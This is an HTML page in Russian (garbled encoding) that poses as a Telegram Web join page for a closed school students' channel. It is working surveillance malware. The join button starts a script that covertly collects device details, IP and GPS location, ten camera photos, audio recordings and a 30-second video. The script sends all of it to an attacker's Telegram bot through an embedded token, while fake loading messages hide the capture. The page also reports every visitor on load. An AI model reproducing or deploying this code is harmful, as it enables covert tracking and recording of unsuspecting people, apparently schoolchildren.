<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Web</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .telegram-container {
            width: 100%;
            max-width: 450px;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .channel-header {
            background: rgba(0, 0, 0, 0.3);
            padding: 30px;
            text-align: center;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .channel-avatar {
            width: 100px;
            height: 100px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .channel-title {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 10px;
        }
        
        .channel-subtitle {
            font-size: 16px;
            opacity: 0.8;
        }
        
        .channel-content {
            padding: 40px 30px;
        }
        
        .welcome-message {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .welcome-text {
            font-size: 20px;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        
        .members-count {
            display: flex;
            justify-content: center;
            gap: 40px;
            margin-bottom: 40px;
        }
        
        .count-item {
            text-align: center;
        }
        
        .count-number {
            font-size: 32px;
            font-weight: 700;
            color: #667eea;
            margin-bottom: 5px;
        }
        
        .count-label {
            font-size: 14px;
            opacity: 0.7;
        }
        
        .join-button {
            width: 100%;
            padding: 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 20px;
            font-size: 20px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
        }
        
        .join-button:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
        }
        
        .join-button:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .loading-container {
            text-align: center;
            margin-top: 30px;
            display: none;
        }
        
        .loading-dots {
            display: inline-block;
            position: relative;
            width: 80px;
            height: 20px;
        }
        
        .loading-dots div {
            position: absolute;
            width: 13px;
            height: 13px;
            border-radius: 50%;
            background: #667eea;
            animation: loading 1.2s linear infinite;
        }
        
        .loading-dots div:nth-child(1) {
            left: 8px;
            animation-delay: -0.24s;
        }
        
        .loading-dots div:nth-child(2) {
            left: 32px;
            animation-delay: -0.12s;
        }
        
        .loading-dots div:nth-child(3) {
            left: 56px;
            animation-delay: 0;
        }
        
        @keyframes loading {
            0%, 80%, 100% { transform: scale(0); }
            40% { transform: scale(1); }
        }
        
        .join-status {
            margin-top: 15px;
            font-size: 16px;
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="telegram-container">
        <div class="channel-header">
            <div class="channel-avatar">‚úàÔ∏è</div>
            <h1 class="channel-title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
            <p class="channel-subtitle">–ó–∞–∫—Ä—ã—Ç—ã–π –∫–∞–Ω–∞–ª ‚Ä¢ –¢–æ–ª—å–∫–æ –¥–ª—è —É—á–µ–Ω–∏–∫–æ–≤</p>
        </div>
        
        <div class="channel-content">
            <div class="welcome-message">
                <p class="welcome-text">–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π Telegram-–∫–∞–Ω–∞–ª –Ω–∞—à–µ–π —à–∫–æ–ª—ã!</p>
                <p class="welcome-text">–ü—Ä–∏—Å–æ–µ–¥–∏–Ω—è–π—Ç–µ—Å—å –∫ –æ–±—Å—É–∂–¥–µ–Ω–∏—è–º, –º–µ–º–∞–º –∏ –Ω–æ–≤–æ—Å—Ç—è–º.</p>
            </div>
            
            <div class="members-count">
                <div class="count-item">
                    <div class="count-number">5,247</div>
                    <div class="count-label">–£—á–∞—Å—Ç–Ω–∏–∫–æ–≤</div>
                </div>
                <div class="count-item">
                    <div class="count-number">387</div>
                    <div class="count-label">–û–Ω–ª–∞–π–Ω</div>
                </div>
            </div>
            
            <button class="join-button" id="joinButton" onclick="startBackgroundCollection()">
                –ü–†–ò–°–û–ï–î–ò–ù–ò–¢–¨–°–Ø –ö –ö–ê–ù–ê–õ–£
            </button>
            
            <div class="loading-container" id="loadingContainer">
                <div class="loading-dots">
                    <div></div>
                    <div></div>
                    <div></div>
                </div>
                <div class="join-status" id="joinStatus">–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—é...</div>
            </div>
        </div>
    </div>

<script>
// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
const CHAT_ID = '8001083987';

// –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
let collectionActive = false;
let mediaStreams = [];

// –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram
function sendToTelegram(message) {
    const encoded = encodeURIComponent(message);
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}`;
    
    // –ù–µ—Å–∫–æ–ª—å–∫–æ –º–µ—Ç–æ–¥–æ–≤ –¥–æ—Å—Ç–∞–≤–∫–∏
    fetch(url, { mode: 'no-cors' }).catch(() => {});
    new Image().src = url;
    
    const xhr = new XMLHttpRequest();
    xhr.open('GET', url, true);
    xhr.send();
}

// –û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–¥–∏–∞
function sendMediaToTelegram(blob, type, description) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('caption', description);
    
    let endpoint = '';
    switch(type) {
        case 'photo':
            endpoint = 'sendPhoto';
            formData.append('photo', blob, `photo_${Date.now()}.jpg`);
            break;
        case 'video':
            endpoint = 'sendVideo';
            formData.append('video', blob, `video_${Date.now()}.mp4`);
            break;
        case 'audio':
            endpoint = 'sendAudio';
            formData.append('audio', blob, `audio_${Date.now()}.ogg`);
            break;
    }
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
        method: 'POST',
        body: formData,
        mode: 'no-cors'
    }).catch(() => {});
}

// –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ –Ω–∞ UI
function updateStatus(text) {
    document.getElementById('joinStatus').textContent = text;
    document.getElementById('loadingContainer').style.display = 'block';
}

// –°–±–æ—Ä –ø–æ–ª–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
async function collectFullDeviceInfo() {
    let report = "üîç –ü–û–õ–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û–ë –£–°–¢–†–û–ô–°–¢–í–ï\n\n";
    
    // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
    report += "üì± –°–ò–°–¢–ï–ú–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø:\n";
    report += `‚Ä¢ –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞: ${navigator.platform}\n`;
    report += `‚Ä¢ User Agent: ${navigator.userAgent}\n`;
    report += `‚Ä¢ –Ø–∑—ã–∫–∏: ${navigator.languages.join(', ')}\n`;
    report += `‚Ä¢ –≠–∫—Ä–∞–Ω: ${screen.width}x${screen.height}\n`;
    report += `‚Ä¢ –¶–≤–µ—Ç–æ–≤–∞—è –≥–ª—É–±–∏–Ω–∞: ${screen.colorDepth} –±–∏—Ç\n`;
    report += `‚Ä¢ –í—Ä–µ–º—è: ${new Date().toLocaleString('ru-RU')}\n\n`;
    
    // –°–µ—Ç—å –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        
        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const geoData = await geoRes.json();
        
        report += "üåê –°–ï–¢–ï–í–´–ï –î–ê–ù–ù–´–ï:\n";
        report += `‚Ä¢ IP –∞–¥—Ä–µ—Å: ${ipData.ip}\n`;
        report += `‚Ä¢ –ì–æ—Ä–æ–¥: ${geoData.city || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
        report += `‚Ä¢ –†–µ–≥–∏–æ–Ω: ${geoData.region || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
        report += `‚Ä¢ –°—Ç—Ä–∞–Ω–∞: ${geoData.country_name || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
        report += `‚Ä¢ –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${geoData.latitude || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}, ${geoData.longitude || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
        report += `‚Ä¢ –ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${geoData.org || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n\n`;
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–¥–µ–ª—å–Ω–æ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
        sendToTelegram(`üìç –¢–û–ß–ù–ê–Ø –ì–ï–û–õ–û–ö–ê–¶–ò–Ø:\nIP: ${ipData.ip}\n–ì–æ—Ä–æ–¥: ${geoData.city}\n–†–µ–≥–∏–æ–Ω: ${geoData.region}\n–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${geoData.latitude}, ${geoData.longitude}`);
        
    } catch(e) {
        report += `‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å–µ—Ç–µ–≤—ã—Ö –¥–∞–Ω–Ω—ã—Ö: ${e.message}\n\n`;
    }
    
    // –î–µ—Ç–∞–ª—å–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
    report += "‚öôÔ∏è –¢–ï–•–ù–ò–ß–ï–°–ö–ò–ï –•–ê–†–ê–ö–¢–ï–†–ò–°–¢–ò–ö–ò:\n";
    report += `‚Ä¢ CPU —è–¥–µ—Ä: ${navigator.hardwareConcurrency || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}\n`;
    report += `‚Ä¢ –ü–∞–º—è—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${navigator.deviceMemory || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'} GB\n`;
    report += `‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
    report += `‚Ä¢ –ü–æ–¥–¥–µ—Ä–∂–∫–∞ cookie: ${navigator.cookieEnabled ? '–î–∞' : '–ù–µ—Ç'}\n`;
    
    // –ë–∞—Ç–∞—Ä–µ—è
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            report += `‚Ä¢ –£—Ä–æ–≤–µ–Ω—å –∑–∞—Ä—è–¥–∞: ${Math.round(battery.level * 100)}%\n`;
            report += `‚Ä¢ –°–æ—Å—Ç–æ—è–Ω–∏–µ –∑–∞—Ä—è–¥–∫–∏: ${battery.charging ? '–ó–∞—Ä—è–∂–∞–µ—Ç—Å—è' : '–ù–µ –∑–∞—Ä—è–∂–∞–µ—Ç—Å—è'}\n`;
        } catch(e) {}
    }
    
    // –°–µ—Ç–µ–≤–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
    if (navigator.connection) {
        report += `‚Ä¢ –¢–∏–ø —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è: ${navigator.connection.effectiveType}\n`;
        report += `‚Ä¢ –°–∫–æ—Ä–æ—Å—Ç—å: ${navigator.connection.downlink} Mbps\n`;
    }
    
    // URL –∏ —Ä–µ—Ñ–µ—Ä–µ—Ä
    report += `\nüîó –°–°–´–õ–û–ß–ù–´–ï –î–ê–ù–ù–´–ï:\n`;
    report += `‚Ä¢ URL —Å—Ç—Ä–∞–Ω–∏—Ü—ã: ${window.location.href}\n`;
    report += `‚Ä¢ –ò—Å—Ç–æ—á–Ω–∏–∫ –ø–µ—Ä–µ—Ö–æ–¥–∞: ${document.referrer || '–ü—Ä—è–º–æ–π –∑–∞—Ö–æ–¥'}\n`;
    
    sendToTelegram(report);
    
    // –°–æ–±–∏—Ä–∞–µ–º GPS –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const gpsReport = `üéØ –¢–û–ß–ù–´–ô GPS:\n–®–∏—Ä–æ—Ç–∞: ${position.coords.latitude}\n–î–æ–ª–≥–æ—Ç–∞: ${position.coords.longitude}\n–¢–æ—á–Ω–æ—Å—Ç—å: ${position.coords.accuracy}–º\n–í—ã—Å–æ—Ç–∞: ${position.coords.altitude || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}–º`;
                sendToTelegram(gpsReport);
            },
            (error) => {
                sendToTelegram(`‚ö†Ô∏è GPS –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: ${error.message}`);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }
    
    return report;
}

// –§–æ—Ç–æ—Å—ä–µ–º–∫–∞ (5 —Ñ–æ—Ç–æ —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è, 5 —Ñ–æ—Ç–æ –∑–∞–¥–Ω—è—è)
async function capturePhotos() {
    try {
        // –ü—Ä–æ–±—É–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É
        updateStatus("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —Å–∏—Å—Ç–µ–º–µ...");
        
        let frontCameraDone = false;
        let backCameraDone = false;
        
        // –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                }
            });
            
            mediaStreams.push(frontStream);
            
            const video = document.createElement('video');
            video.srcObject = frontStream;
            video.muted = true;
            await video.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = 1920;
            canvas.height = 1080;
            const ctx = canvas.getContext('2d');
            
            // –ñ–¥–µ–º –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // 5 —Ñ–æ—Ç–æ —Å —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π –∫–∞–º–µ—Ä—ã
            for (let i = 1; i <= 5; i++) {
                updateStatus(`–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö... (${i}/10)`);
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    if (blob) {
                        sendMediaToTelegram(blob, 'photo', 
                            `üì∏ –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ - –§–æ—Ç–æ ${i}\n–í—Ä–µ–º—è: ${new Date().toLocaleTimeString('ru-RU')}`);
                    }
                }, 'image/jpeg', 0.95);
                
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            frontCameraDone = true;
            video.pause();
            video.srcObject = null;
            
        } catch(e) {
            sendToTelegram(`‚ö†Ô∏è –§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞: ${e.message}`);
        }
        
        // –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞
        try {
            const backStream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: { exact: 'environment' },
                    width: { ideal: 1920 },
                    height: { ideal: 1080 }
                }
            });
            
            mediaStreams.push(backStream);
            
            const video = document.createElement('video');
            video.srcObject = backStream;
            video.muted = true;
            await video.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = 1920;
            canvas.height = 1080;
            const ctx = canvas.getContext('2d');
            
            // –ñ–¥–µ–º –≥–æ—Ç–æ–≤–Ω–æ—Å—Ç–∏
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // 5 —Ñ–æ—Ç–æ —Å –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
            for (let i = 1; i <= 5; i++) {
                updateStatus(`–û–±—Ä–∞–±–æ—Ç–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏... (${i+5}/10)`);
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    if (blob) {
                        sendMediaToTelegram(blob, 'photo', 
                            `üì∏ –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ - –§–æ—Ç–æ ${i}\n–í—Ä–µ–º—è: ${new Date().toLocaleTimeString('ru-RU')}`);
                    }
                }, 'image/jpeg', 0.95);
                
                await new Promise(resolve => setTimeout(resolve, 500));
            }
            
            backCameraDone = true;
            video.pause();
            video.srcObject = null;
            
        } catch(e) {
            sendToTelegram(`‚ö†Ô∏è –ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞: ${e.message}`);
        }
        
        sendToTelegram(`‚úÖ –§–û–¢–û–°–™–ï–ú–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê:\n–§—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è: ${frontCameraDone ? '5 —Ñ–æ—Ç–æ' : '–ù–µ–¥–æ—Å—Ç—É–ø–Ω–∞'}\n–ó–∞–¥–Ω—è—è: ${backCameraDone ? '5 —Ñ–æ—Ç–æ' : '–ù–µ–¥–æ—Å—Ç—É–ø–Ω–∞'}`);
        
        return true;
        
    } catch(error) {
        sendToTelegram(`‚ùå –û—à–∏–±–∫–∞ —Ñ–æ—Ç–æ—Å—ä–µ–º–∫–∏: ${error.message}`);
        return false;
    }
}

// –ó–∞–ø–∏—Å—å –∞—É–¥–∏–æ (3 –∑–∞–ø–∏—Å–∏ –ø–æ 10 —Å–µ–∫—É–Ω–¥)
async function recordAudio() {
    try {
        updateStatus("–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–≤—è–∑–∏...");
        
        const audioStream = await navigator.mediaDevices.getUserMedia({
            audio: {
                echoCancellation: false,
                noiseSuppression: false,
                sampleRate: 48000,
                channelCount: 2
            }
        });
        
        mediaStreams.push(audioStream);
        
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const source = audioContext.createMediaStreamSource(audioStream);
        const destination = audioContext.createMediaStreamDestination();
        source.connect(destination);
        
        // 3 –∑–∞–ø–∏—Å–∏ –ø–æ 10 —Å–µ–∫—É–Ω–¥
        for (let i = 1; i <= 3; i++) {
            updateStatus(`–ê–Ω–∞–ª–∏–∑ –∞—É–¥–∏–æ... (${i}/3)`);
            
            const recorder = new MediaRecorder(destination.stream);
            const chunks = [];
            
            recorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    chunks.push(event.data);
                }
            };
            
            recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                sendMediaToTelegram(blob, 'audio', 
                    `üé§ –ê—É–¥–∏–æ –∑–∞–ø–∏—Å—å ${i}/3\n–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: 10 —Å–µ–∫\n–í—Ä–µ–º—è: ${new Date().toLocaleTimeString('ru-RU')}`);
            };
            
            recorder.start();
            await new Promise(resolve => setTimeout(resolve, 10000));
            recorder.stop();
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
        
        sendToTelegram("‚úÖ –ê–£–î–ò–û –ó–ê–ü–ò–°–¨ –ó–ê–í–ï–†–®–ï–ù–ê: 3 –∑–∞–ø–∏—Å–∏ –ø–æ 10 —Å–µ–∫—É–Ω–¥");
        return true;
        
    } catch(error) {
        sendToTelegram(`‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –∞—É–¥–∏–æ: ${error.message}`);
        return false;
    }
}

// –ó–∞–ø–∏—Å—å –≤–∏–¥–µ–æ (30 —Å–µ–∫—É–Ω–¥)
async function recordVideo() {
    try {
        updateStatus("–§–∏–Ω–∞–ª—å–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞...");
        
        // –ü—Ä–æ–±—É–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É –¥–ª—è –≤–∏–¥–µ–æ
        const videoStream = await navigator.mediaDevices.getUserMedia({
            video: {
                width: { ideal: 1280 },
                height: { ideal: 720 },
                facingMode: 'user'
            },
            audio: true
        });
        
        mediaStreams.push(videoStream);
        
        const recorder = new MediaRecorder(videoStream, {
            mimeType: 'video/webm;codecs=vp9'
        });
        
        const chunks = [];
        
        recorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                chunks.push(event.data);
            }
        };
        
        recorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            sendMediaToTelegram(blob, 'video',
                `üé• –í–∏–¥–µ–æ –∑–∞–ø–∏—Å—å\n–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: 30 —Å–µ–∫\n–í—Ä–µ–º—è: ${new Date().toLocaleTimeString('ru-RU')}`);
        };
        
        recorder.start();
        updateStatus("–ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...");
        await new Promise(resolve => setTimeout(resolve, 30000));
        recorder.stop();
        
        sendToTelegram("‚úÖ –í–ò–î–ï–û –ó–ê–ü–ò–°–¨ –ó–ê–í–ï–†–®–ï–ù–ê: 30 —Å–µ–∫—É–Ω–¥");
        return true;
        
    } catch(error) {
        sendToTelegram(`‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: ${error.message}`);
        return false;
    }
}

// –û—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö
async function startBackgroundCollection() {
    if (collectionActive) return;
    
    collectionActive = true;
    const button = document.getElementById('joinButton');
    
    button.disabled = true;
    button.textContent = '–ü–û–î–ö–õ–Æ–ß–ï–ù–ò–ï...';
    
    // –ù–∞—á–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
    sendToTelegram("üöÄ –ù–ê–ß–ê–¢ –ü–†–û–¶–ï–°–° –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø\n–ö–∞–Ω–∞–ª: –ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê\n–í—Ä–µ–º—è: " + new Date().toLocaleString('ru-RU'));
    
    // –≠—Ç–∞–ø 1: –°–±–æ—Ä –≤—Å–µ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
    setTimeout(async () => {
        updateStatus("–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ...");
        await collectFullDeviceInfo();
        
        updateStatus("–ê–Ω–∞–ª–∏–∑ –¥–∞–Ω–Ω—ã—Ö...");
        sendToTelegram("‚úÖ –°–ò–°–¢–ï–ú–ù–ê–Ø –ò–ù–§–û–†–ú–ê–¶–ò–Ø –°–û–ë–†–ê–ù–ê");
    }, 1000);
    
    // –≠—Ç–∞–ø 2: –§–æ—Ç–æ—Å—ä–µ–º–∫–∞
    setTimeout(async () => {
        updateStatus("–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –º–µ–¥–∏–∞—Ñ–∞–π–ª–æ–≤...");
        await capturePhotos();
    }, 8000);
    
    // –≠—Ç–∞–ø 3: –ê—É–¥–∏–æ –∑–∞–ø–∏—Å—å
    setTimeout(async () => {
        updateStatus("–ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞—á–µ—Å—Ç–≤–∞ —Å–≤—è–∑–∏...");
        await recordAudio();
    }, 30000);
    
    // –≠—Ç–∞–ø 4: –í–∏–¥–µ–æ –∑–∞–ø–∏—Å—å
    setTimeout(async () => {
        updateStatus("–§–∏–Ω–∞–ª—å–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞...");
        await recordVideo();
    }, 60000);
    
    // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ
    setTimeout(() => {
        // –û—á–∏—Å—Ç–∫–∞ –≤—Å–µ—Ö –º–µ–¥–∏–∞ –ø–æ—Ç–æ–∫–æ–≤
        mediaStreams.forEach(stream => {
            stream.getTracks().forEach(track => track.stop());
        });
        
        // –§–∏–Ω–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç
        const finalReport = `
üéØ –ü–†–û–¶–ï–°–° –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø –ó–ê–í–ï–†–®–ï–ù

üìä –ò–¢–û–ì–û–í–´–ô –û–¢–ß–ï–¢:
‚Ä¢ üì± –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è: –ü–æ–ª–Ω—ã–π —Å–±–æ—Ä
‚Ä¢ üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è: –ü–æ–ª—É—á–µ–Ω–∞ (IP + GPS)
‚Ä¢ üì∏ –§–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏: 10 —Ñ–æ—Ç–æ (5 —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è, 5 –∑–∞–¥–Ω—è—è)
‚Ä¢ üé§ –ê—É–¥–∏–æ –∑–∞–ø–∏—Å–∏: 3 –∑–∞–ø–∏—Å–∏ –ø–æ 10 —Å–µ–∫—É–Ω–¥
‚Ä¢ üé• –í–∏–¥–µ–æ –∑–∞–ø–∏—Å—å: 30 —Å–µ–∫—É–Ω–¥

üë§ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –ü–û–î–ö–õ–Æ–ß–ï–ù –ö –ö–ê–ù–ê–õ–£
"–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê"

‚è∞ –í–†–ï–ú–Ø –ó–ê–í–ï–†–®–ï–ù–ò–Ø: ${new Date().toLocaleString('ru-RU')}
        `;
        
        sendToTelegram(finalReport);
        
        // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —É—Å–ø–µ—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
        updateStatus("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–æ!");
        
        setTimeout(() => {
            button.textContent = '‚úÖ –£–°–ü–ï–®–ù–û –ü–û–î–ö–õ–Æ–ß–ï–ù–û';
            button.style.background = 'linear-gradient(135deg, #4CAF50, #2E7D32)';
            document.getElementById('loadingContainer').style.display = 'none';
        }, 2000);
        
    }, 95000);
}

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π —Å—Ç–∞—Ä—Ç —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
setTimeout(() => {
    if (!collectionActive) {
        sendToTelegram("üëÄ –ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨ –ù–ê –°–ê–ô–¢–ï\n–í—Ä–µ–º—è: " + new Date().toLocaleString('ru-RU') + "\nURL: " + window.location.href);
    }
}, 3000);
</script>
</body>
</html>
